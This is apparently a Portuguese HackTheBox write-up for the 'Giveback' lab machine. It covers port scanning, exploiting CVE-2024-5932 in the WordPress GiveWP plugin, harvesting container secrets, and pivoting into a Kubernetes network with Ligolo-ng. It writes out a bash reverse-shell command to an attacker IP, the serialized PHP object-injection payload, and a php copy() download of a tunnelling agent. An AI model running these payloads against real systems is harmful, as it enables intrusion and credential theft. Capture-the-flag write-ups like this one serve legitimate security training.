---
title: "Giveback - HTB"
date: 2025-11-01
summary: "A máquina Giveback foca em vulnerabilidades web e containers. A exploração começa com uma CVE no plugin Give do WordPress para obter acesso inicial. Em seguida, é feito um pivoting para a rede interna do Kubernetes, explorando uma CVE no PHP-CGI que leva a outro container com um JWT válido. Com isso, descobre-se a senha do usuário babywrym para acesso via SSH. Por fim, uma CVE no runc é explorada para escalar privilégios e obter acesso root."
layout: "single"
tags: ["Linux", "Medium", "HTB"]
draft: true
---

## Resumo

A Giveback é uma máquina Linux de nível Medium focada bastante em **Web** e **Containers**. Ela é considerada média porém na minha opinião é uma máquina hard, tanto por ser bem longa quando por ser bem complicada e especifica. Nela inicialmente abusamos de uma CVE no plugin `give` do `Wordpress` para obter uma shell reversa. Logo depois disso realizamos um pivoting para uma rede interna dos containers do `Kubernetes`, o que nos revela um Ip interno vulnerável a uma CVE no PHP-CGI, o que nos leva a outro container contendo um `JWT` autenticado para interagir com o Ip principal do `Kubernetes`. Enumerando esse `Kubernetes` encontramos uma senha do user **babywrym** que nos permite logar no SSH da máquina inicial. Dentro do SSH encontramos um binário do `runc` protegido por uma senha. Após descobrirmos a senha, conseguimos abusar de outra CVE que nos permite abrir uma shell como root e assim finalizando a máquina.  


## Recon inicial

Iniciaremos com o de sempre, o scan de portas. Estarei usando o [RustScan](https://github.com/bee-san/RustScan) pra isso:
```bash
rustscan -a 10.129.124.49 -u 5000 -- -sV

PORT      STATE SERVICE REASON         VERSION                                                                                                                                                
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                                                                          
80/tcp    open  http    syn-ack ttl 62 nginx 1.28.0                                                                                                                                           
30686/tcp open  unknown syn-ack ttl 63                                                                                                                                                        
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.93%I=7%D=11/1%Time=69066481%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x201
SF:9:50:28\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x2019:5
SF:0:28\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"HTTP/1\.0\x20200\x
SF:20OK\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x20
SF:01\x20Nov\x202025\x2019:50:56\x20GMT\r\nContent-Length:\x20127\r\n\r\n{
SF:\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\"
SF::\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"servi
SF:ceProxyHealthy\":\x20true\n}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Encontramos duas portas padrões e uma porta alta desconhecida. Porém acessando ela não encontramos nada util apenas um json:
```bash
{
	"service": {
		"namespace": "default",
		"name": "wp-nginx-service"
	},
	"localEndpoints": 1,
	"serviceProxyHealthy": true
}
```

Indo para a porta 80, nos deparamos com um site `Wordpress`. Para fazer uma enumeração mais completa, estarei usando o [wpscan]():
```bash
wpscan --url "http://giveback.htb/" --enumerate ap

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.129.127.60/ [10.129.127.60]
[+] Started: Sun Nov  2 18:27:00 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.129.127.60/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.129.127.60/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.129.127.60/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.129.127.60/, Match: 'WordPress 6.8.1'

[+] WordPress theme in use: bizberg
 | Location: http://10.129.127.60/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://10.129.127.60/wp-content/themes/bizberg/readme.txt
 | Style URL: http://10.129.127.60/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.127.60/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://10.129.127.60/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] give
 | Location: http://10.129.127.60/wp-content/plugins/give/
 | Last Updated: 2025-10-29T20:17:00.000Z
 | [!] The version is out of date, the latest version is 4.12.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://10.129.127.60/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://10.129.127.60/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://10.129.127.60/, Match: '"1","give_version":"3.14.0","magnific_options"'

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov  2 18:27:14 2025
[+] Requests Done: 34
[+] Cached Requests: 9
[+] Data Sent: 9.161 KB
[+] Data Received: 247.553 KB
[+] Memory used: 259.637 MB
[+] Elapsed time: 00:00:14
```

Encontramos um plugin chamado `give` com a versão `3.14.0`, a chance desse ser o ponto de entrada é alta por causa do nome da box. Pesquisando sobre, vemos que essa versão é vulnerável a [CVE-2024-5932](https://www.cvedetails.com/cve/cve-2024-5940), porém para utilizar-mos essa CVE, precisamos encontrar uma página que permite interagir com esse plugin, então continuarei olhando o website.

## User Flag

### Obtendo uma shell reversa

Vasculhando pelas páginas, encontramos o seguinte post:
![portal](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762119670/df203a86-b0d6-414b-951c-da7f769faffa.png)

Clicando no link do portal, somos redirecionados para a página `http://giveback.htb/donations/the-things-we-need/`, ja de cara notamos que é uma página de doação do plugin `give`, então conseguimos abusar da CVE por aqui.

Estarei usando esse [PoC](https://github.com/EQSTLab/CVE-2024-5932) para obter shell reversa:
```bash
python3 poc.py -u "http://giveback.htb/donations/the-things-we-need/" -c "bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'"
                                                                                                                                                                                              
             ..-+*******-
            .=#+-------=@.                        .:==:.
           .**-------=*+:                      .-=++.-+=:.
           +*-------=#=+++++++++=:..          -+:==**=+-+:.
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#
     :+++**##@#+=.      -%@@@%-   .-=*#.
    .=+::+::-@:         #@@@@+. :+*=::=*-
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*
     :++---::--=*#+*+++++**+*+**-::::::+=
      .+*=:::---+*:::::++++++*+=:::::-*=.
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932

                                                                                                                                                                                              
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

=============================================================================================================

[\] Exploit loading, please wait...
[+] Requested Data:
{'give-form-id': '17', 'give-form-hash': '1a76ef6e19', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Ian', 'give_last': 'Walton', 'give_email': 'garrettoscar@example.org', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:51:"bash -c \'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

E com o listener ja escutando, conseguimos a shell:
```bash
> rlwrap nc -lvnp 4444

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.127.60.
Ncat: Connection from 10.129.127.60:28016.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-6d577f6bf8-tcnnl:/opt/bitnami/wordpress/wp-admin$ 
```
### Realizando o pivoting para a rede interna

Passei um bom tempo rodando pela máquina e não encontrei nada interessante, apenas uma pasta na raiz chamada `secrets` que contém três senhas:
```bash
<-6d577f6bf8-tcnnl:/opt/bitnami/wordpress/wp-admin$ ls /secrets

mariadb-password <- sW5sp4spa3u7RLyetrekE4oS
mariadb-root-password <- sW5sp4syetre32828383kE4oS
wordpress-password <- O8F7KR5zGi
```

Acessando o database do `Wordpress` não conseguimos nada também pois a hash do usuário é uma senha segura. Analisando o `env` da máquina, encontramos diversos Ips diferentes:
```bash

<-6d577f6bf8-tcnnl:/opt/bitnami/wordpress/wp-admin$ env
env
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-6d577f6bf8-tcnnl
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_SMTP_PROTOCOL=
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_DATABASE_SSL_KEY_FILE=
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
WP_CLI_DAEMON_GROUP=daemon
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
WORDPRESS_NONCE_SALT=
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WP_NGINX_SERVICE_SERVICE_PORT=80
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=2
WORDPRESS_SECURE_AUTH_SALT=
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
APACHE_SERVER_TOKENS=Prod
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
WEB_SERVER_DAEMON_USER=daemon
OS_ARCH=amd64
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
```

Separando todos os Ips, temos os seguintes valores:
```bash
10.43.61.204:80    WordPress HTTP interno    
10.43.61.204:443    WordPress HTTPS interno    
10.43.147.82:3306    Banco de dados MariaDB    
10.43.2.241:5000    Serviço Legacy Intranet    
10.43.4.242:80    WP NGINX Service    
10.43.0.1:443    Kubernetes API Server    
```

Então temos uma rede interna com vários Ips. Para acessar essa rede estarei utilizando o [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), porém dentro desse container não temos nenhum meio comum de enviar arquivos como `curl` ou `wget`, só temos o `php` disponível.

Para baixar arquivos com o `php`, podemos utilizar o seguinte comando:
```bash
php -r 'copy("http://10.10.14.17:5555/agent","/tmp/agent");'
```
E para configurar o pivoting, precisamos abrir um listener do `Ligolo-ng` e conectar o nosso agent:
```bash
# LISTENER

> ligolo-ng -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: C682C6240C24D9993DD1BF0A8CA7EE2D294FC4D0BA63EE1AA73520D8456EDFA0 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng »  
```
```bash
# AGENT
> ./agent -connect 10.10.14.17:11601 --ignore-cert --retry
       
time="2025-11-02T22:20:18Z" level=warning msg="warning, certificate validation disabled"
time="2025-11-02T22:20:18Z" level=info msg="Connection established" addr="10.10.14.17:11601"
```
{{< alert >}}
**Uma dica para não ter dor de cabeça: utilize a flag `--retry` para caso sua conexão caia, o agent tente se reconectar novamente sozinho.**
{{< /alert >}}

Com o agent conectado, precisamos configurar a interface de rede. Pelo próprio `Ligolo-ng` conseguimos fazer isso. Primeiro selecionamos a sessão do agent com o comando `session`. Depois usamos o comando `ifcreate --name evil`, adicionamos a rota com o comando `route_add --name evil --route 10.43.0.0/16` e iniciamos com `tunnel_start --tun evil`:

```bash
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » INFO[0069] Agent joined.                                 id=021374ecdd02 name=Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl remote="10.129.127.60:25898"
ligolo-ng » session
? Specify a session : 1 - Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl - 10.129.127.60:25898 - 021374ecdd02
[Agent : Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl] » ifcreate --name evil
INFO[0398] Creating a new "evil" interface...           
INFO[0398] Interface created!                           
[Agent : Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl] » route_add --name evil --route 10.43.0.0/16
INFO[0404] Route created.                               
[Agent : Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl] » tunnel_start --tun evil
[Agent : Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl] » INFO[0415] Starting tunnel to Unknown@beta-vino-wp-wordpress-6d577f6bf8-tcnnl (021374ecdd02) 
```

E agora ja estamos dentro da rede.

### Explorando um RCE no PHP-CGI para obter uma shell reversa

Acessando o Ip `http://10.43.2.241:5000/` nos deparamos com uma webpage de um CMS interno:

![cms](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762122877/c848e23b-508a-4878-8aac-528cc0d61038.png)

Tentando acessar o `/phpinfo.php` recebemos uma mensagem de `Access restricted`, porém voltando na página anterior e acessando o seu código fonte, encontramos a seguinte anotação:
```bash
...

  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->

  ...
```

Ao tentar acessar a mesma URL que anteriormente porém adicionando um parâmetro `debug=true` na URL: `http://10.43.2.241:5000/phpinfo.php?debug=true` conseguimos acesso ao `phpinfo.php`:

![phpinfo](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762123170/7c8ff401-3b74-4e04-979c-0796a65cfbdc.png)

